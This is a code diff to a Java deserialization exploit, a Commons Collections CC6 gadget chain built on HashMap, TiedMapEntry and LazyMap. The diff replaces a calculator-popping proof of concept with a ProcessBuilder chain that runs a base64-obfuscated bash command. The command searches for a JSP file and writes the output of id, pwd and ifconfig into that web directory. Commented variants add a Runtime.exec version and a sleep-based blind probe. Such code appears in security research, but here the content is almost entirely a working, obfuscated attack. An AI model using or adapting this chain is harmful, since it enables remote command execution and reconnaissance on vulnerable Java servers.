@@ -8,6 +8,7 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import org.su18.serialize.utils.SerializeUtil;
 
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Map;
@@ -22,13 +23,30 @@ public class CC6WithHashMap {
 		// 初始化 HashMap
 		HashMap<Object, Object> hashMap = new HashMap<>();
 
-		// 创建 ChainedTransformer
+//		// 创建 ChainedTransformer
+//		Transformer[] transformers = new Transformer[]{
+//				new ConstantTransformer(Runtime.class),
+//				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+//				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+//				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"bash -c {echo,ZmluZCAvIC1uYW1lIGNvbW1vbi1wcml2YXRlLmpzcHx3aGlsZSByZWFkIGY7ZG8gc2ggLWMgJ2lkO3B3ZDtpZmNvbmZpZycgPiQoZGlybmFtZSAkZikvdGVzdC50eHQ7ZG9uZQ==}|{base64,-d}|{bash,-i}"})
+//		};
+
+		// 创建 ProcessBuilder
 		Transformer[] transformers = new Transformer[]{
-				new ConstantTransformer(Runtime.class),
-				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
-				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
-				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
+				new ConstantTransformer(ProcessBuilder.class),
+				new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String[].class}}),
+				new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new String[]{"bash","-c","{echo,ZmluZCAvIC1uYW1lIGNvbW1vbi1wcml2YXRlLmpzcHx3aGlsZSByZWFkIGY7ZG8gc2ggLWMgJ2lkO3B3ZDtpZmNvbmZpZycgPiQoZGlybmFtZSAkZikvdGVzdC50eHQ7ZG9uZQ==}|{base64,-d}|{bash,-i}"}}}),
+				new InvokerTransformer("start", new Class[]{}, new Object[]{})
 		};
+
+		// Sleep
+//		Transformer[] transformers = new Transformer[]{
+//				new ConstantTransformer(java.lang.Thread.class),
+//				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"currentThread", null}),
+//				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+//				new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{Long.parseLong("10000")}),
+//		};
+
 
 		// 创建一个空的 ChainedTransformer
 		ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});
@@ -57,6 +75,12 @@ public class CC6WithHashMap {
 
 		SerializeUtil.writeObjectToFile(hashMap);
 		SerializeUtil.readFileObject();
+
+		Thread.sleep(1000000);
+
+
+//		SerializeUtil.readFileObject("aaa.bin");
+
 
 	}
 
